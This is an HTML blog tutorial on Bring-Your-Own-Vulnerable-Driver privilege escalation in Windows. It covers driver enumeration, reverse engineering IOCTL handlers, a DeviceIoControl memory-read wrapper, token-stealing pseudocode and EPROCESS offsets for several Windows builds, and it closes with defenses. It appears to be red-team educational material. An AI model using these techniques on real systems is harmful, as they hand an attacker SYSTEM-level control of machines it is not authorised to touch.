@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Abusing Windows Drivers For Privilege Escalation - Shravan Kumar Sheri</title>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Learn how attackers abuse vulnerable Windows drivers (BYOVD) for privilege escalation, including driver enumeration, reverse engineering, and exploit development.">
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+	<style>
+		* { box-sizing: border-box; }
+		body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; margin: 0; padding: 0; line-height: 1.8; color: #333; }
+
+		.progress-bar-container { position: fixed; top: 0; left: 0; width: 100%; height: 4px; background: #e9ecef; z-index: 1001; }
+		.progress-bar-fill { height: 100%; background: linear-gradient(90deg, #eb3349, #f45c43); width: 0%; transition: width 0.1s; }
+
+		.navbar { background-color: #1a1a2e !important; padding: 15px 0; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; }
+		.navbar-brand { color: #fff !important; font-size: 22px; font-weight: 600; }
+		.nav-link { color: rgba(255,255,255,0.9) !important; font-size: 16px; margin-left: 20px; transition: color 0.3s; }
+		.nav-link:hover { color: #4a9eff !important; }
+
+		.article-header { background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%); color: #fff; padding: 80px 0; }
+		.article-header .container { max-width: 800px; }
+		.back-link { color: rgba(255,255,255,0.9); text-decoration: none; display: inline-flex; align-items: center; margin-bottom: 30px; font-size: 14px; transition: color 0.3s; }
+		.back-link:hover { color: #fff; text-decoration: none; }
+		.back-link i { margin-right: 8px; }
+		.article-category { display: inline-block; padding: 6px 16px; background: rgba(255,255,255,0.2); border-radius: 20px; font-size: 12px; font-weight: 600; text-transform: uppercase; margin-bottom: 20px; }
+		.article-title { font-size: 42px; font-weight: 700; margin-bottom: 20px; line-height: 1.2; }
+		.article-meta { display: flex; flex-wrap: wrap; gap: 20px; font-size: 14px; opacity: 0.9; }
+		.article-meta span { display: flex; align-items: center; }
+		.article-meta i { margin-right: 8px; }
+
+		.article-content { max-width: 800px; margin: 0 auto; padding: 60px 20px; }
+		.article-body { background: #fff; padding: 50px; border-radius: 12px; box-shadow: 0 5px 30px rgba(0,0,0,0.08); }
+		.article-body h2 { font-size: 28px; font-weight: 700; color: #1a1a2e; margin-top: 40px; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 2px solid #e9ecef; }
+		.article-body h2:first-child { margin-top: 0; }
+		.article-body h3 { font-size: 22px; font-weight: 600; color: #333; margin-top: 30px; margin-bottom: 15px; }
+		.article-body p { font-size: 18px; line-height: 1.8; margin-bottom: 20px; color: #444; }
+		.article-body ul, .article-body ol { margin-bottom: 20px; padding-left: 30px; }
+		.article-body li { font-size: 18px; line-height: 1.8; margin-bottom: 10px; color: #444; }
+		.article-body code { background: #f4f4f4; padding: 3px 8px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 16px; color: #d63384; }
+		.article-body pre { background: #1a1a2e; color: #fff; padding: 25px; border-radius: 8px; overflow-x: auto; margin: 25px 0; }
+		.article-body pre code { background: none; color: #fff; padding: 0; }
+
+		.article-body blockquote { border-left: 4px solid #eb3349; padding: 20px 25px; margin: 25px 0; background: #f8f9fa; border-radius: 0 8px 8px 0; }
+		.article-body blockquote p { margin: 0; font-style: italic; color: #555; }
+
+		.toc { background: #f8f9fa; padding: 25px 30px; border-radius: 8px; margin-bottom: 40px; }
+		.toc h4 { font-size: 16px; font-weight: 700; color: #1a1a2e; margin-bottom: 15px; text-transform: uppercase; }
+		.toc ul { list-style: none; padding: 0; margin: 0; }
+		.toc li { margin-bottom: 10px; }
+		.toc a { color: #555; text-decoration: none; font-size: 15px; transition: color 0.3s; }
+		.toc a:hover { color: #eb3349; }
+
+		.share-section { margin-top: 50px; padding-top: 30px; border-top: 1px solid #e9ecef; }
+		.share-section h4 { font-size: 16px; font-weight: 600; color: #666; margin-bottom: 15px; }
+		.share-buttons { display: flex; gap: 10px; }
+		.share-btn { width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; text-decoration: none; transition: transform 0.3s, opacity 0.3s; }
+		.share-btn:hover { transform: scale(1.1); color: #fff; text-decoration: none; }
+		.share-btn.twitter { background: #1da1f2; }
+		.share-btn.linkedin { background: #0077b5; }
+		.share-btn.copy { background: #6c757d; cursor: pointer; }
+
+		.author-box { display: flex; align-items: center; gap: 20px; background: #f8f9fa; padding: 25px; border-radius: 12px; margin-top: 40px; }
+		.author-avatar { width: 80px; height: 80px; background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 32px; font-weight: 700; flex-shrink: 0; }
+		.author-info h4 { font-size: 18px; font-weight: 700; color: #1a1a2e; margin-bottom: 5px; }
+		.author-info p { font-size: 14px; color: #666; margin: 0; }
+
+		.tags { margin-top: 30px; }
+		.tag { display: inline-block; padding: 6px 14px; background: #e9ecef; color: #495057; border-radius: 20px; font-size: 13px; margin-right: 8px; margin-bottom: 8px; text-decoration: none; transition: background 0.3s; }
+		.tag:hover { background: #dee2e6; text-decoration: none; color: #333; }
+
+		.warning-box { background: #fff3cd; border-left: 4px solid #ffc107; padding: 20px; border-radius: 0 8px 8px 0; margin: 25px 0; }
+		.warning-box p { margin: 0; color: #856404; }
+		.info-box { background: #e3f2fd; border-left: 4px solid #2196f3; padding: 20px; border-radius: 0 8px 8px 0; margin: 25px 0; }
+		.info-box p { margin: 0; color: #1565c0; }
+		.success-box { background: #d4edda; border-left: 4px solid #28a745; padding: 20px; border-radius: 0 8px 8px 0; margin: 25px 0; }
+		.success-box p { margin: 0; color: #155724; }
+
+		footer { background: #1a1a2e; color: #fff; padding: 30px 0; text-align: center; margin-top: 60px; }
+		footer p { margin: 0; opacity: 0.8; }
+
+		@media (max-width: 768px) {
+			.article-title { font-size: 28px; }
+			.article-body { padding: 30px 20px; }
+			.article-meta { flex-direction: column; gap: 10px; }
+			.author-box { flex-direction: column; text-align: center; }
+		}
+	</style>
+</head>
+<body>
+	<div class="progress-bar-container">
+		<div class="progress-bar-fill" id="progressBar"></div>
+	</div>
+
+	<nav class="navbar navbar-expand-lg navbar-dark">
+		<div class="container">
+			<a class="navbar-brand" href="../index.html">Shravan Kumar Sheri</a>
+			<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav">
+				<span class="navbar-toggler-icon"></span>
+			</button>
+			<div class="collapse navbar-collapse" id="navbarNav">
+				<ul class="navbar-nav ml-auto">
+					<li class="nav-item">
+						<a class="nav-link" href="../index.html">Home</a>
+					</li>
+					<li class="nav-item active">
+						<a class="nav-link" href="../blog.html">Blog</a>
+					</li>
+				</ul>
+			</div>
+		</div>
+	</nav>
+
+	<header class="article-header">
+		<div class="container">
+			<a href="../blog.html" class="back-link">
+				<i class="fas fa-arrow-left"></i> Back to Blog
+			</a>
+			<span class="article-category">Exploitation</span>
+			<h1 class="article-title">Abusing Windows Drivers For Privilege Escalation</h1>
+			<div class="article-meta">
+				<span><i class="far fa-calendar"></i> December 16, 2024</span>
+				<span><i class="far fa-clock"></i> 15 min read</span>
+				<span><i class="far fa-user"></i> Shravan Kumar Sheri</span>
+			</div>
+		</div>
+	</header>
+
+	<article class="article-content">
+		<div class="article-body">
+			<div class="toc">
+				<h4>Table of Contents</h4>
+				<ul>
+					<li><a href="#introduction">Introduction</a></li>
+					<li><a href="#byovd">BYOVD - Bring Your Own Vulnerable Driver</a></li>
+					<li><a href="#how-it-works">How Driver Abuse Works</a></li>
+					<li><a href="#step1">Step 1: Driver Enumeration</a></li>
+					<li><a href="#step2">Step 2: Reverse Engineering the Driver</a></li>
+					<li><a href="#step3">Step 3: IOCTL Identification</a></li>
+					<li><a href="#step4">Step 4: Exploit Development</a></li>
+					<li><a href="#post-exploitation">Post-Exploitation: Token Stealing</a></li>
+					<li><a href="#os-versions">OS Version Considerations</a></li>
+					<li><a href="#conclusion">Conclusion</a></li>
+				</ul>
+			</div>
+
+			<h2 id="introduction">Introduction</h2>
+			<p>
+				Windows drivers operate at the kernel level (Ring 0), providing them with unrestricted access to system resources. When these drivers contain vulnerabilities, attackers can leverage them to escalate privileges from a standard user to SYSTEM-level access. This technique has become increasingly popular in both red team operations and real-world attacks.
+			</p>
+
+			<div class="warning-box">
+				<p><strong>Disclaimer:</strong> This article is intended for educational purposes and authorized security testing only. Always obtain proper authorization before testing these techniques.</p>
+			</div>
+
+			<h2 id="byovd">BYOVD - Bring Your Own Vulnerable Driver</h2>
+			<p>
+				BYOVD (Bring Your Own Vulnerable Driver) is a technique where attackers load a known vulnerable driver onto a target system to exploit it for privilege escalation. This approach has been used by numerous threat actors and malware families.
+			</p>
+
+			<h3>Notable BYOVD Statistics</h3>
+			<ul>
+				<li><strong>Lazarus Group:</strong> Used BYOVD in multiple campaigns targeting cryptocurrency firms</li>
+				<li><strong>RobbinHood Ransomware:</strong> Exploited GIGABYTE driver vulnerabilities</li>
+				<li><strong>BlackByte Ransomware:</strong> Leveraged vulnerable MSI drivers</li>
+				<li><strong>Cuba Ransomware:</strong> Used vulnerable drivers for defense evasion</li>
+			</ul>
+
+			<p>
+				Microsoft maintains a blocklist of vulnerable drivers, but this list is not comprehensive and many vulnerable drivers remain unblocked. The LOLDrivers project (<code>loldrivers.io</code>) maintains a comprehensive list of known vulnerable drivers.
+			</p>
+
+			<h2 id="how-it-works">How Driver Abuse Works</h2>
+			<p>
+				The exploitation of vulnerable drivers follows a general pattern:
+			</p>
+
+			<ol>
+				<li><strong>Driver Loading:</strong> The attacker loads a vulnerable driver onto the system (requires admin privileges initially)</li>
+				<li><strong>IOCTL Communication:</strong> The attacker communicates with the driver through DeviceIoControl calls</li>
+				<li><strong>Arbitrary Operations:</strong> Vulnerable IOCTLs allow arbitrary read/write or code execution in kernel mode</li>
+				<li><strong>Privilege Escalation:</strong> Token stealing or other techniques elevate privileges to SYSTEM</li>
+			</ol>
+
+			<h2 id="step1">Step 1: Driver Enumeration</h2>
+			<p>
+				Before exploitation, we need to identify loaded drivers and potential targets. Several tools and techniques can help with this:
+			</p>
+
+			<h3>Using DriverView</h3>
+			<p>
+				NirSoft's DriverView provides a GUI for viewing loaded drivers with details like company name, version, and file path.
+			</p>
+
+			<h3>PowerShell Enumeration</h3>
+			<pre><code># List all loaded drivers
+Get-WmiObject Win32_SystemDriver | Select-Object Name, PathName, State
+
+# Get driver details
+driverquery /v /fo csv | ConvertFrom-Csv
+
+# Find third-party drivers (potential targets)
+Get-WindowsDriver -Online | Where-Object {$_.ProviderName -ne "Microsoft"}</code></pre>
+
+			<h3>WinDbg Commands</h3>
+			<pre><code>// List loaded modules
+lm
+
+// Get detailed info about a specific driver
+lm vm drivername
+
+// Show driver object information
+!drvobj \Driver\DriverName</code></pre>
+
+			<h2 id="step2">Step 2: Reverse Engineering the Driver</h2>
+			<p>
+				Once a target driver is identified, we need to reverse engineer it to understand its functionality and find vulnerabilities. Key areas to analyze:
+			</p>
+
+			<h3>DriverEntry Analysis</h3>
+			<p>
+				The <code>DriverEntry</code> function is the driver's entry point. Key things to identify:
+			</p>
+			<ul>
+				<li><strong>Device Creation:</strong> Look for <code>IoCreateDevice</code> and <code>IoCreateSymbolicLink</code></li>
+				<li><strong>IRP Handlers:</strong> Functions assigned to <code>MajorFunction</code> array</li>
+				<li><strong>Security Descriptors:</strong> How access control is implemented</li>
+			</ul>
+
+			<pre><code>// Typical DriverEntry structure in IDA/Ghidra
+NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
+{
+    // Create device
+    IoCreateDevice(DriverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
+
+    // Create symbolic link for user-mode access
+    IoCreateSymbolicLink(&SymbolicLinkName, &DeviceName);
+
+    // Set up IRP handlers
+    DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateHandler;
+    DriverObject->MajorFunction[IRP_MJ_CLOSE] = CloseHandler;
+    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControlHandler;
+
+    return STATUS_SUCCESS;
+}</code></pre>
+
+			<h3>IRP_MJ_DEVICE_CONTROL Handler</h3>
+			<p>
+				This is the most critical function to analyze as it handles IOCTL requests from user mode. Look for:
+			</p>
+			<ul>
+				<li>Switch statements on IOCTL codes</li>
+				<li>Buffer handling (input/output)</li>
+				<li>Lack of input validation</li>
+				<li>Dangerous operations (memory access, MSR reads/writes)</li>
+			</ul>
+
+			<h2 id="step3">Step 3: IOCTL Identification</h2>
+			<p>
+				IOCTL (I/O Control) codes are used to communicate with drivers. Understanding IOCTL structure is essential:
+			</p>
+
+			<h3>IOCTL Code Structure</h3>
+			<pre><code>// IOCTL code breakdown (32-bit value)
+// Bits 31-16: Device Type
+// Bits 15-14: Required Access
+// Bits 13-2:  Function Code
+// Bits 1-0:   Transfer Type
+
+#define CTL_CODE(DeviceType, Function, Method, Access) \
+    (((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method))
+
+// Transfer Methods:
+// METHOD_BUFFERED (0)    - System copies data between user and kernel buffers
+// METHOD_IN_DIRECT (1)   - Input buffer is locked in memory
+// METHOD_OUT_DIRECT (2)  - Output buffer is locked in memory
+// METHOD_NEITHER (3)     - Direct access to user buffers (dangerous!)</code></pre>
+
+			<h3>Finding IOCTLs</h3>
+			<p>
+				In IDA Pro or Ghidra, search for IOCTL handling patterns:
+			</p>
+			<ul>
+				<li>Look for comparisons against constant values in the DeviceControl handler</li>
+				<li>Search for <code>IoControlCode</code> field access in IRP structure</li>
+				<li>Use cross-references to track IOCTL handling paths</li>
+			</ul>
+
+			<div class="info-box">
+				<p><strong>Tip:</strong> Tools like <code>OSR Device Tree</code> can help identify device names and symbolic links for interacting with drivers.</p>
+			</div>
+
+			<h2 id="step4">Step 4: Exploit Development</h2>
+			<p>
+				Once vulnerable IOCTLs are identified, we can develop exploits. Common vulnerability classes include:
+			</p>
+
+			<h3>Arbitrary Physical Memory Read/Write</h3>
+			<p>
+				Many vulnerable drivers expose functionality to read or write physical memory:
+			</p>
+
+			<pre><code>// User-mode exploit structure
+typedef struct _MEMORY_REQUEST {
+    ULONGLONG PhysicalAddress;
+    ULONGLONG Size;
+    PVOID Buffer;
+} MEMORY_REQUEST;
+
+// Exploit code
+BOOL ReadPhysicalMemory(HANDLE hDevice, ULONGLONG PhysAddr, PVOID Buffer, SIZE_T Size)
+{
+    MEMORY_REQUEST request;
+    request.PhysicalAddress = PhysAddr;
+    request.Size = Size;
+    request.Buffer = Buffer;
+
+    DWORD bytesReturned;
+    return DeviceIoControl(
+        hDevice,
+        IOCTL_READ_PHYSICAL_MEMORY,  // Vulnerable IOCTL
+        &request,
+        sizeof(request),
+        Buffer,
+        Size,
+        &bytesReturned,
+        NULL
+    );
+}</code></pre>
+
+			<h3>Arbitrary MSR Read/Write</h3>
+			<p>
+				Model-Specific Registers (MSRs) contain sensitive CPU configuration data:
+			</p>
+
+			<pre><code>// Writing to MSR can disable security features
+// MSR 0xC0000082 = LSTAR (syscall handler address)
+// By overwriting this, attackers can redirect syscalls
+
+typedef struct _MSR_REQUEST {
+    ULONG MsrIndex;
+    ULONGLONG Value;
+} MSR_REQUEST;</code></pre>
+
+			<h2 id="post-exploitation">Post-Exploitation: Token Stealing</h2>
+			<p>
+				The most common privilege escalation technique using kernel read/write is token stealing. This involves copying the token from a SYSTEM process to our process.
+			</p>
+
+			<h3>Understanding Token Structure</h3>
+			<pre><code>// Each process has EPROCESS structure in kernel
+// EPROCESS contains Token field pointing to access token
+// System processes have highly privileged tokens
+
+// Key offsets (Windows 10 21H2, may vary by build):
+// EPROCESS.UniqueProcessId:    +0x440
+// EPROCESS.ActiveProcessLinks: +0x448
+// EPROCESS.Token:              +0x4b8</code></pre>
+
+			<h3>Token Stealing Steps</h3>
+			<ol>
+				<li>Find SYSTEM process EPROCESS address (PID 4)</li>
+				<li>Read SYSTEM process token</li>
+				<li>Find current process EPROCESS address</li>
+				<li>Overwrite current process token with SYSTEM token</li>
+			</ol>
+
+			<pre><code>// Pseudocode for token stealing
+ULONG64 FindSystemProcess() {
+    // Walk ActiveProcessLinks to find PID 4
+    ULONG64 current = initialEprocess;
+    do {
+        ULONG pid = ReadKernelMemory(current + PID_OFFSET);
+        if (pid == 4) return current;
+        current = ReadKernelMemory(current + LINKS_OFFSET) - LINKS_OFFSET;
+    } while (current != initialEprocess);
+    return 0;
+}
+
+void StealToken(ULONG64 systemEprocess, ULONG64 currentEprocess) {
+    // Read SYSTEM token
+    ULONG64 systemToken = ReadKernelMemory(systemEprocess + TOKEN_OFFSET);
+
+    // Write SYSTEM token to our process
+    WriteKernelMemory(currentEprocess + TOKEN_OFFSET, systemToken);
+
+    // Now our process has SYSTEM privileges!
+}</code></pre>
+
+			<div class="warning-box">
+				<p><strong>Note:</strong> Token stealing modifies kernel structures. A crash can result in BSOD. Always test in a controlled environment.</p>
+			</div>
+
+			<h2 id="os-versions">OS Version Considerations</h2>
+			<p>
+				EPROCESS offsets vary between Windows versions. Key considerations:
+			</p>
+
+			<h3>Finding Correct Offsets</h3>
+			<ul>
+				<li><strong>Symbol Files:</strong> Microsoft provides PDB files with structure definitions</li>
+				<li><strong>WinDbg:</strong> Use <code>dt nt!_EPROCESS</code> to dump structure</li>
+				<li><strong>Online Resources:</strong> Vergiliusproject.com maintains offset databases</li>
+			</ul>
+
+			<h3>Common Offsets by Version</h3>
+			<pre><code>// Windows 10 1909
+EPROCESS.UniqueProcessId:    0x2e8
+EPROCESS.ActiveProcessLinks: 0x2f0
+EPROCESS.Token:              0x360
+
+// Windows 10 21H2
+EPROCESS.UniqueProcessId:    0x440
+EPROCESS.ActiveProcessLinks: 0x448
+EPROCESS.Token:              0x4b8
+
+// Windows 11 22H2
+EPROCESS.UniqueProcessId:    0x440
+EPROCESS.ActiveProcessLinks: 0x448
+EPROCESS.Token:              0x4b8</code></pre>
+
+			<h3>Additional Security Mitigations</h3>
+			<ul>
+				<li><strong>VBS/HVCI:</strong> Virtualization-based security can prevent unsigned driver loading</li>
+				<li><strong>Driver Blocklist:</strong> Microsoft blocks known vulnerable drivers</li>
+				<li><strong>Code Integrity:</strong> Requires signed drivers on 64-bit systems</li>
+				<li><strong>Secure Boot:</strong> Ensures boot chain integrity</li>
+			</ul>
+
+			<h2 id="conclusion">Conclusion</h2>
+			<p>
+				Windows driver exploitation remains a powerful technique for privilege escalation. The BYOVD approach allows attackers to bring known vulnerable drivers to target systems, bypassing many traditional security controls. Understanding this technique is essential for both red team operators and defenders.
+			</p>
+
+			<blockquote>
+				<p>The key to defense is reducing the attack surface: enable HVCI, keep systems updated, and monitor for suspicious driver loading activities.</p>
+			</blockquote>
+
+			<h3>Key Takeaways</h3>
+			<ul>
+				<li>Vulnerable drivers provide a path from admin to kernel-level access</li>
+				<li>BYOVD allows attackers to bring their own vulnerable drivers</li>
+				<li>Token stealing is the most common post-exploitation technique</li>
+				<li>HVCI and driver blocklists provide defense but are not complete solutions</li>
+				<li>Structure offsets vary by OS version - always verify before exploitation</li>
+			</ul>
+
+			<div class="tags">
+				<a href="#" class="tag">Windows</a>
+				<a href="#" class="tag">Privilege Escalation</a>
+				<a href="#" class="tag">Kernel Exploitation</a>
+				<a href="#" class="tag">BYOVD</a>
+				<a href="#" class="tag">Red Team</a>
+				<a href="#" class="tag">Drivers</a>
+			</div>
+
+			<div class="share-section">
+				<h4>Share this article</h4>
+				<div class="share-buttons">
+					<a href="#" class="share-btn twitter" onclick="shareTwitter()" title="Share on Twitter">
+						<i class="fab fa-twitter"></i>
+					</a>
+					<a href="#" class="share-btn linkedin" onclick="shareLinkedIn()" title="Share on LinkedIn">
+						<i class="fab fa-linkedin-in"></i>
+					</a>
+					<div class="share-btn copy" onclick="copyLink()" title="Copy link">
+						<i class="fas fa-link"></i>
+					</div>
+				</div>
+			</div>
+
+			<div class="author-box">
+				<div class="author-avatar">SK</div>
+				<div class="author-info">
+					<h4>Shravan Kumar Sheri</h4>
+					<p>Security Engineer & Researcher specializing in offensive security, red teaming, and exploit development.</p>
+				</div>
+			</div>
+		</div>
+	</article>
+
+	<footer>
+		<div class="container">
+			<p>&copy; 2025 Shravan Kumar Sheri - All Rights Reserved</p>
+		</div>
+	</footer>
+
+	<script>
+		window.addEventListener('scroll', () => {
+			const scrollTop = document.documentElement.scrollTop;
+			const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+			const progress = (scrollTop / scrollHeight) * 100;
+			document.getElementById('progressBar').style.width = progress + '%';
+		});
+
+		function shareTwitter() {
+			const url = encodeURIComponent(window.location.href);
+			const text = encodeURIComponent(document.title);
+			window.open(`https://twitter.com/intent/tweet?url=${url}&text=${text}`, '_blank');
+		}
+
+		function shareLinkedIn() {
+			const url = encodeURIComponent(window.location.href);
+			window.open(`https://www.linkedin.com/sharing/share-offsite/?url=${url}`, '_blank');
+		}
+
+		function copyLink() {
+			navigator.clipboard.writeText(window.location.href).then(() => {
+				alert('Link copied to clipboard!');
+			});
+		}
+
+		document.querySelectorAll('.toc a').forEach(link => {
+			link.addEventListener('click', function(e) {
+				e.preventDefault();
+				const targetId = this.getAttribute('href').slice(1);
+				const target = document.getElementById(targetId);
+				if (target) {
+					target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+				}
+			});
+		});
+	</script>
+</body>
+</html>
